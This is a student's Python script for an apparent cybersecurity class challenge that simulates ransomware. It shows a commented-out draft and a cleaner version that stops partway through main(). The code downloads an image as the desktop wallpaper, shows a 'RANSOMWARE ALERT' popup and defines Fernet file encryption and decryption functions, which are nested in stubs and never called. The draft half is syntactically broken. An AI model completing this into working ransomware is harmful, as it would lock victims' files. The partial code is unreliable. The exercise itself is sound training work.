# # !/usr/bin/env python3
# # Script: OPS 401 Class 02 Ops Challenge Solution
# # Author: Ademola
# # Date of latest revision: 26 April 2023
# # Purpose: Ops Challenge: File Encryption Script Part 3 of 3
# # import librararies

# from cryptography.fernet import Fernet
# import os, math, time, datetime, getpass, os.path
# import urllib.request
# import ctypes
# import pyautogui
# from appscript import app, mactypes


# # Requirements
# # Alter the desktop wallpaper on a Windows PC with a ransomware message
# # Create a popup window on a Windows PC with a ransomware message

# # Method 1: change_desktop_background
# def change_desktop_background():
#   # Need an imageURl
#     image_url = https://www.wweek.com/resizer/86tt-U3ytIrtb7bBYXAIg7XWz7A=/1200x0/filters:quality(100)/s3.amazonaws.com/arc-wordpress-client-uploads/wweek/wp-content/uploads/2019/08/30145212/Nicolas-Cage.jpg
#   # Need a path to save Image too
# # /home/ademo11/OPS-401-Code-Challenge/URL
#   # Tool: urllib request the image url and saves it to the path
# def request_image():
#     urllib.request.urlretrieve(" https://www.wweek.com/resizer/86tt-U3ytIrtb7bBYXAIg7XWz7A=/1200x0/filters:quality(100)/s3.amazonaws.com/arc-wordpress-client-uploads/wweek/wp-content/uploads/2019/08/30145212/Nicolas-Cage.jpg", /home/ademo11/OPS-401-Code-Challenge/URL ):
  
#   # ----- WINDOWS OS -----
#     # Access windows dlls for funcionality eg, changing dekstop wallpaper
#     # Tool: ctypes => allow us to change the background
#     # Need to set  #so access Desktop functionality
# def SPI_SETDESKWALLPAPER = 20():
#     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, /home/ademo11/OPS-401-Code-Challenge/URL, 0 )

#   # ----- Linux OS -----
#   # Using the os package to access the gnome shell and passing it a file. This will change the desktop
# def change_desktop():
#     os.system("gsettings set org.gnome.desktop.background picture-uri file:/home/ademo11/OPS-401-Code-Challenge/URL")


# def write_key():
#     # Generate a key and save it into a file
#     key = Fernet.generate_key()
#     with open("key.key", "wb") as key_file:
#         key_file.write(key)
        
# def load_key():
#     # load the key from the current directory named 'key.key'
#     return open("key.key", "rb").read()


# # OS's can use this, installed through python
# # Method 2: pop_up
# def pop_up():
#     pyautogiu => sends alerts! All OS's can use this, installed through python
#     return pyautogui.alert("YO- you been 'Caged'!", "RANSOMWARE ALERT!!!!", button='WHAT!?!')


# # Method 3: ransomeware
# def ransomeware():
#   # Encrypt directory contents()

#     def encrypt_file(file_path, key):
#         with open(file_path, 'rb') as file:
#             data = file.read()
#         f = Fernet(key)
#         encrypted_data = f.encrypt(data)
#         with open(file_path, 'wb') as file:
#             file.write(encrypted_data)  
#   # change_desktop_background()
#   # time.sleep(10)
#   # pop_up()


# # Method 4: ransomeware_restore
# def ransomeware_restore():
#   #   # Decrypt the dir contents()
# def decrypt_file(file_path, key):
#     with open(file_path, 'rb') as file:
#         data = file.read()
#     f = Fernet(key)
#     decrypted_data = f.decrypt(data)
#     with open(file_path, 'wb') as file:
#         file.write(decrypted_data)
          
#   #   # restore background()

# # Method 5: restore background
# def restore_background():
#   # Utilize the backgorund tool depending on your OS to provide it a default/original background

# file_size = os.stat("key.key" ).st_size
# if file_size == 0:
#     write_key()
    
# key = load_key()   
# if __name__ == "__main__":
#     main()
    
# # NEED USER INPUT!
# # what mode? 7=>ransomeware, 8=> restore
# # provide a dir to ransome or set a default directory

# #     ------ END ------

#!/usr/bin/env python3
# Script: OPS 401 Class 02 Ops Challenge Solution
# Author: Ademola
# Date of latest revision: 26 April 2023
# Purpose: Ops Challenge: File Encryption Script Part 3 of 3

import os, urllib.request, ctypes, pyautogui
from cryptography.fernet import Fernet

# Requirements
# Alter the desktop wallpaper on a Windows PC with a ransomware message
# Create a popup window on a Windows PC with a ransomware message

IMAGE_URL = "https://www.wweek.com/resizer/86tt-U3ytIrtb7bBYXAIg7XWz7A=/1200x0/filters:quality(100)/s3.amazonaws.com/arc-wordpress-client-uploads/wweek/wp-content/uploads/2019/08/30145212/Nicolas-Cage.jpg"
URL_PATH = "/home/ademo11/OPS-401-Code-Challenge/URL"
SPI_SETDESKWALLPAPER = 20

# Method 1: change_desktop_background
def change_desktop_background():
    # Tool: urllib request the image url and saves it to the path
    urllib.request.urlretrieve(IMAGE_URL, URL_PATH)

    # ----- WINDOWS OS -----
    # Access windows dlls for functionality eg, changing desktop wallpaper
    # Tool: ctypes => allow us to change the background
    # Need to set # so access Desktop functionality
    if os.name == "nt":
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, URL_PATH, 0)

    # ----- Linux OS -----
    # Using the os package to access the gnome shell and passing it a file. This will change the desktop
    elif os.name == "posix":
        os.system("gsettings set org.gnome.desktop.background picture-uri file:{}".format(URL_PATH))

def write_key():
    # Generate a key and save it into a file
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
        
def load_key():
    # load the key from the current directory named 'key.key'
    return open("key.key", "rb").read()

# Method 2: pop_up
def pop_up():
    # pyautogui => sends alerts! All OS's can use this, installed through python
    return pyautogui.alert("YO- you been 'Caged'!", "RANSOMWARE ALERT!!!!", button='WHAT!?!')

# Method 3: ransomware
def ransomware():
    # Encrypt directory contents()
    def encrypt_file(file_path, key):
        with open(file_path, 'rb') as file:
            data = file.read()
        f = Fernet(key)
        encrypted_data = f.encrypt(data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)  

# Method 4: ransomware_restore
def ransomware_restore():
    # Decrypt the dir contents()
    def decrypt_file(file_path, key):
        with open(file_path, 'rb') as file:
            data = file.read()
        f = Fernet(key)
        decrypted_data = f.decrypt(data)
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)

# Method 5: restore_background
def restore_background():
    # Utilize the background tool depending on your OS to provide it a default/original background
    pass

def main():
    # check if the key exists,
